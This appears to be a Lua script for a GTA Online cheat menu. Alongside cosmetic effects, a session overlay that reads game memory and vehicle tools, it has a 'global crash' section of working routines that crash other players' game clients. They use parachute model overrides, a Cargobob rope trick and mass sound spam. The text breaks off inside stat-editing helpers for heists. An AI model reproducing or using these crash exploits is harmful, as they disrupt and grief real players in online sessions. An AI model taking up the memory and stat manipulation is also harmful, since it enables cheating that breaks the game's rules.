
util.show_corner_help("~italic~~b~加载成功^-^欢迎使用 " .."\n ‹  ‹  ‹ ~g~\n交流群593702379 ~p~QWQ" )
util.require_natives("natives-1640181023")

util.require_natives("1640181023")
local player_vehicle 
local mst_warn
local lastwpn
local mode 
local wpn
local altitude = 0
local missile_nearby 
colors = {

    green = 184,

    red = 6,

    yellow = 190,

    black = 2,

    white = 1,

    gray = 3,

    pink = 201,

    purple = 49, 

    blue = 11

    }

    function notification(message, color)

        HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)

    

        local picture = "CHAR_SOCIAL_CLUB"

        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 0)

        while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do

            util.yield()

        end

        util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)

    

        title = " ‹YIYU Script ‹"

        if color == colors.red or color == colors.red then

            subtitle = "~u~信息"

        elseif color == colors.black then

            subtitle = "~c~信息"

        else

            subtitle = "~u~信息"

        end

        HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, picture, true, 4, title, subtitle)

    

        HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)

        util.log(message)

    end
    notification(" 欢迎使用YIYU Script 2.0 ", colors.black)

 util.toast("建议安装字库使用此脚本，文件可加群下载")

 util.keep_running()
 scaleform_thread = util.create_thread(function (thr)

	scaleForm = GRAPHICS.REQUEST_SCALEFORM_MOVIE("MP_BIG_MESSAGE_FREEMODE")

	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleForm, "SHOW_SHARD_WASTED_MP_MESSAGE")

	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_PLAYER_NAME_STRING("~w~  ‹欢迎使用 YIYU Script Version2.0 ‹")

	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    AUDIO.PLAY_SOUND_FRONTEND(55, "FocusIn", "HintCamSounds", true)

	starttime = os.time()

	while true do

	if os.time() - starttime >= 5 then

	    AUDIO.PLAY_SOUND_FRONTEND(55, "FocusOut", "HintCamSounds", true)

	    util.stop_thread()

    end

	if GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleForm) then

	   GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleForm, 255, 255, 255, 255,0)

    end

	   util.yield(1)

        end

    end)
 MISC.FORCE_LIGHTNING_FLASH()



function draw_string(s, x, y, scale, font)
	HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
	HUD.SET_TEXT_FONT(font or 0)
	HUD.SET_TEXT_SCALE(scale, scale)
	HUD.SET_TEXT_DROP_SHADOW()
	HUD.SET_TEXT_WRAP(0.0, 1.0)
	HUD.SET_TEXT_DROPSHADOW(1, 0, 0, 0, 0)
	HUD.SET_TEXT_OUTLINE()
	HUD.SET_TEXT_EDGE(1, 0, 0, 0, 0)
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(s)
	HUD.END_TEXT_COMMAND_DISPLAY_TEXT(x, y)
end

local fps = 0
util.create_thread(function()
    while true do
        fps = math.ceil(1/SYSTEM.TIMESTEP())
        util.yield(500)
    end
end)
local replayInterface = memory.read_long(memory.rip(memory.scan("48 8D 0D ? ? ? ? 48 8B D7 E8 ? ? ? ? 48 8D 0D ? ? ? ? 8A D8 E8 ? ? ? ? 84 DB 75 13 48 8D 0D") + 3))
local pedInterface = memory.read_long(replayInterface + 0x0018)
local vehInterface = memory.read_long(replayInterface + 0x0010)
local objectInterface = memory.read_long(replayInterface + 0x0028)
local pickupInterface = memory.read_long(replayInterface + 0x0020)
function zhujixvlie()
inviciamountint = 0
            for pid = 0, 31 do
                if players.exists(pid) and pid ~= players.user() then
                    local pped = players.user_ped(pid)
                    if pped ~= 0 then
                        if players.is_marked_as_modder(pid) then 
                            inviciamountint = inviciamountint + 1
                        end
                    end
                end
local ente
                    local ent1e = players.user_ped()
                    local ent2e = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
                    if PED.IS_PED_IN_ANY_VEHICLE(ent1e,true) then
                        ente = ent2e
                    else
                        ente = ent1e
                    end
                    local speede = ENTITY.GET_ENTITY_SPEED(ente)
                    local speedcalce = speede * 3.6
                    myspeed1e = math.ceil(speedcalce)
            end
                inviciamountintt = inviciamountint
            draw_string(string.format("~bold~战局人数: ~g~"..#players.list()), 0.163,0.776, 0.4,1) 
            draw_string(string.format("~bold~作弊者: ~r~"..inviciamountintt), 0.163,0.803, 0.4,1) 
            draw_string(string.format("~bold~战局主机: ~y~"..players.get_name(players.get_host())), 0.163,0.830, 0.4,1)
            draw_string(string.format("~bold~脚本主机: ~b~"..players.get_name(players.get_script_host())), 0.163,0.857, 0.4,1)
            draw_string(string.format("~bold~~w~Ped: ~s~"..memory.read_int(pedInterface + 0x0110).."/"..memory.read_int(pedInterface + 0x0108)), 0.163,0.884, 0.4,1)
            draw_string(string.format("~bold~~w~载具: ~s~"..memory.read_int(vehInterface + 0x0190).."/"..memory.read_int(vehInterface + 0x0188)), 0.163,0.911, 0.4,1)
            draw_string(string.format("~bold~~w~物体: ~s~"..memory.read_int(objectInterface + 0x0168).."/"..memory.read_int(objectInterface + 0x0160)), 0.163,0.938, 0.4,1)
            draw_string(string.format("~bold~~w~可拾取物: ~s~"..memory.read_int(pickupInterface + 0x0110).."/"..memory.read_int(pickupInterface + 0x0108)), 0.163,0.965, 0.4,1)
end

menu.toggle_loop(menu.my_root(), "主机序列", {"hostqu"}, "", function()
zhujixvlie()
end)


self= menu.list(menu.my_root(), "自我选项", {}, "", function(); end)

local new = {}

function new.colour(R, G, B, A)
    return {r = R / 255, g = G / 255, b = B / 255, a = A or 1}
end

function new.hudSettings(X, Y, ALIGNMENT)
    return {xOffset = X, yOffset = Y, scale = 0.5, alignment = ALIGNMENT, textColour = new.colour( 255, 255, 255 )}
end

function new.delay(MS, S, MIN)
    return {ms = MS, s = S, min = MIN}
end

local mildOrangeFire = new.colour( 255, 127, 80 )

local fireWings = {
    [1] = {pos = {[1] = 120, [2] =  75}},
    [2] = {pos = {[1] = 120, [2] = -75}},
    [3] = {pos = {[1] = 135, [2] =  75}},
    [4] = {pos = {[1] = 135, [2] = -75}},
    [5] = {pos = {[1] = 180, [2] =  75}},
    [6] = {pos = {[1] = 180, [2] = -75}},
    [7] = {pos = {[1] = 195, [2] =  75}},
    [8] = {pos = {[1] = 195, [2] = -75}},
}

local fireWingsSettings = {
    scale = 0.3,
    colour = mildOrangeFire,
    on = false
}

    local function loadModel(hash)
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
    end

local hcb = menu.list(self, '火翅膀选项', {}, '')

        local ptfxEgg
        menu.toggle(hcb, '火翅膀', {'JSfireWings'}, '', function (toggle)
            fireWingsSettings.on = toggle
            if fireWingsSettings.on then
                ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
                if ptfxEgg == nil then
                    local eggHash = 1803116220
                    loadModel(eggHash)
                    ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                    ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
                    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
                end
                for i = 1, #fireWings do
                    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                        STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                        util.yield()
                    end
                    GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
                    fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], fireWingsSettings.scale, false, false, false)

                    util.create_tick_handler(function()
                        local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                        ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                        for i = 1, #fireWings do
                            GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWings[i].ptfx, fireWingsSettings.scale)
                            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, fireWingsSettings.colour.r, fireWingsSettings.colour.g, fireWingsSettings.colour.b)
                        end

                        ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                        return fireWingsSettings.on
                    end)
                end
            else
                for i = 1, #fireWings do
                    if fireWings[i].ptfx then
                        GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                        fireWings[i].ptfx = nil
                    end
                    if ptfxEgg then
                        entities.delete_by_handle(ptfxEgg)
                        ptfxEgg = nil
                    end
                end
                STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
            end
        end)

        menu.slider(hcb, '火翅膀大小', {'JSfireWingsScale'}, '', 1, 100, 3, 1, function(value)
            fireWingsSettings.scale = value / 10
        end)

        menu.rainbow(menu.colour(hcb, '火翅膀颜色', {'JSfireWingsColour'}, '', fireWingsSettings.colour, false, function(colour)
            fireWingsSettings.colour = colour
        end))

        local levitationCommand = menu.ref_by_path('Self>Movement>Levitation>Levitation', 38)
        local firebreath = menu.list(self, '喷火选项', {}, '')
    
        local fireBreathSettings = {
            scale = 0.3,
            colour = mildOrangeFire,
            on = false,
            y = { value = 0.12, still = 0.12, walk =  0.22, sprint = 0.32, sneak = 0.35 },
            z = { value = 0.58, still = 0.58, walk =  0.45, sprint = 0.38, sneak = 0.35 },
        }
    
        local function transitionValue(value, target, step)
            if value == target then return value end
            return value + step * ( value > target and -1 or 1 )
        end
    
        function fireBreathSettings:changePos(movementType)
            self.z.value = transitionValue(self.z.value, self.z[movementType], 0.01)
            self.y.value = transitionValue(self.y.value, self.y[movementType], 0.01)
        end
    
        menu.toggle(firebreath, '喷火', {'JSfireBreath'}, '', function(toggle)
            fireBreathSettings.on = toggle
            if toggle then
                while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                    STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                    util.yield()
                end
                GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
                fireBreathSettings.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE('muz_xs_turret_flamethrower_looping', players.user_ped(), 0, 0.12, 0.58, 30, 0, 0, 0x8b93, fireBreathSettings.scale, false, false, false)
                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
            else
                GRAPHICS.REMOVE_PARTICLE_FX(fireBreathSettings.ptfx, true)
                fireBreathSettings.ptfx = nil
                STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
            end
            util.create_tick_handler(function()
                local user_ped = players.user_ped()
                if PED.GET_PED_PARACHUTE_STATE(user_ped) == 0 and ENTITY.IS_ENTITY_IN_AIR(user_ped) then
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, 0.81, 0, -10, 0, 0)
                elseif menu.get_value(levitationCommand) then
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, -0.12, 0.58, 150, 0, 0)
                else
                    local movementType = 'still'
                    if TASK.IS_PED_SPRINTING(user_ped) then
                        movementType = 'sprint'
                    elseif TASK.IS_PED_WALKING(user_ped) then
                        movementType = 'walk'
                    elseif PED.GET_PED_STEALTH_MOVEMENT(user_ped) then
                        movementType = 'sneak'
                    end
    
                    fireBreathSettings:changePos(movementType)
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, fireBreathSettings.y.value, fireBreathSettings.z.value, 30, 0, 0)
                end
                return fireBreathSettings.on
            end)
        end)
    
        menu.slider(firebreath, '喷火比例', {'JSfireBreathScale'}, '', 1, 100, fireBreathSettings.scale * 10, 1, function(value)
            fireBreathSettings.scale = value / 10
            GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireBreathSettings.ptfx, fireBreathSettings.scale)
        end)
    
        menu.rainbow(menu.colour(firebreath, '喷火颜色', {'JSfireBreathColour'}, '', fireBreathSettings.colour, false, function(colour)
            fireBreathSettings.colour = colour
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
        end))

zaiju= menu.list(menu.my_root(), "载具选项", {}, "", function(); end)
menu.toggle_loop(zaiju, "载具转向灯（按ADS键使用）", {}, "", function()
    if(PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        local rear = PAD.IS_CONTROL_PRESSED(130, 130)

        if left and not right and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
        elseif right and not left and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        elseif rear and not left and not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        else
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
        end
    end
end)
local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end
menu.toggle(zaiju, "特斯拉自动驾驶", {}, "", function(toggled)
    local ped = players.user_ped()
    local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    request_model(tesla_ai)
    request_model(tesla)
    if toggled then     
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            menu.trigger_commands("deletevehicle")
        end

        tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true) 
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(ped, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        menu.trigger_commands("performance")

        if HUD.IS_WAYPOINT_ACTIVE() then
	    	local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos, 20.0, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20.0, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            entities.delete_by_handle(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            entities.delete_by_handle(tesla_vehicle)
        end
    end
end)


custselc = menu.list(menu.my_root(), "全局崩溃选项", {}, "", function(); end)




menu.divider(custselc, "全局崩溃")

menu.action(custselc, "载具伞崩全局V1", {}, "", function ()
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 15 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 260873931)
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)

    end)

    menu.action(custselc, "载具伞崩全局V2", {}, "", function ()
        local spped = PLAYER.PLAYER_PED_ID()
        local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
        for i = 1, 30 do
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TTPed), true)
            PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 2200, false, true, true)
            util.yield(130)
            VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	3235319999)
            VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
            util.yield(130)
            entities.delete_by_handle(Ruiner2)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    
        end)


    menu.action(custselc, "人物伞崩V1", {}, "", function()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for n = 0 , 3 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
          while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
          while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
end)

menu.action(custselc,"人物伞崩V2", {}, "", function()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1381105889
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 720581693
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        end
end)
menu.action(custselc,"人物伞崩V3",{},"",function()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash =192829538
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 	192829538
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
end
end)

menu.action(custselc,"人物伞崩V4",{},"",function()
    for n = 0 , 5 do
        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        object_hash = 1117917059
                                    STREAMING.REQUEST_MODEL(object_hash)
      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
        bush_hash = 1117917059
                                    STREAMING.REQUEST_MODEL(bush_hash)
      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
           util.yield()
         end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
           util.yield(1000)
        for i = 0 , 20 do
        PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        util.yield(1000)
        menu.trigger_commands("tplsia")
end
end)

menu.action(custselc,"大自然全局崩溃",{},"",function()
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
        util.yield(100)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
        util.yield()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        util.yield(250)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
    end)

    menu.action(custselc, "CARGO崩溃", {}, "", function()
    menu.trigger_commands("anticrashcam on")
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
    local cargobob = CreateVehicle(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local veh = CreateVehicle(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
    local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x, vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
    util.yield(2500)
    entities.delete_by_handle(cargobob)
    entities.delete_by_handle(veh)
    PHYSICS.DELETE_CHILD_ROPE(newRope)
    menu.trigger_commands("anticrashcam off")
    notification("Go Fuck Your Self",colors.red)
    util.toast("Go Fuck Your Self")
end)




menu.action(custselc,"噪音崩溃", {}, "可以崩绿玩或廉价挂", function()
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local time = util.current_time_millis() + 2000
    while time > util.current_time_millis() do
    local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
        end
        util.yield()
        for i = 1, 20 do
        AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
        end
        util.yield()
    end
    util.toast("噪音崩溃完成")
end)
menu.action(menu.my_root(), "查看玩家功能", {}, "", function()
    menu.trigger_commands("playerlist")
end)
renwu=menu.list(menu.my_root(), "任务选项", {}, "", function(); end)

PlayerMainMenu = menu.list(renwu, "抢劫任务", {}, "", function(); end)


function MP_INDEX()
    return "MP" .. util.get_char_slot() .. "_"
end
function IS_MPPLY(Stat)
    local Stats = {
        "MP_PLAYING_TIME",
    }

    for i = 1, #Stats do
        if Stat == Stats[i] then
            return true
        end
    end

    if string.find(Stat, "MPPLY_") then
        return true
    else
        return false
    end
end
function ADD_MP_INDEX(Stat)
    if not IS_MPPLY(Stat) then
        Stat = MP_INDEX() .. Stat
    end
    return Stat
end

function STAT_SET_INT(Stat, Value)
    STATS.STAT_SET_INT(util.joaat(ADD_MP_INDEX(Stat)), Value, true)
end
function STAT_SET_FLOAT(Stat, Value)
    STATS.STAT_SET_FLOAT(util.joaat(ADD_MP_INDEX(Stat)), Value, true)
end
function STAT_SET_BOOL(Stat, Value)
    STATS.STAT_SET_BOOL(util.joaat(ADD_MP_INDEX(Stat)), Value, true)
end
function STAT_SET_STRING(Stat, Value)
    STATS.STAT_SET_STRING(util.joaat(ADD_MP_INDEX(Stat)), Value, true)
end
function STAT_SET_DATE(Stat, Year, Month, Day, Hour, Min)
    local DatePTR = memory.alloc(7*8) 
    memory.write_int(DatePTR, Year)
    memory.write_int(DatePTR+8, Month)
    memory.write_int(DatePTR+16, Day)
    memory.write_int(DatePTR+24, Hour)
    memory.write_int(DatePTR+32, Min)
    memory.write_int(DatePTR+40, 0) 
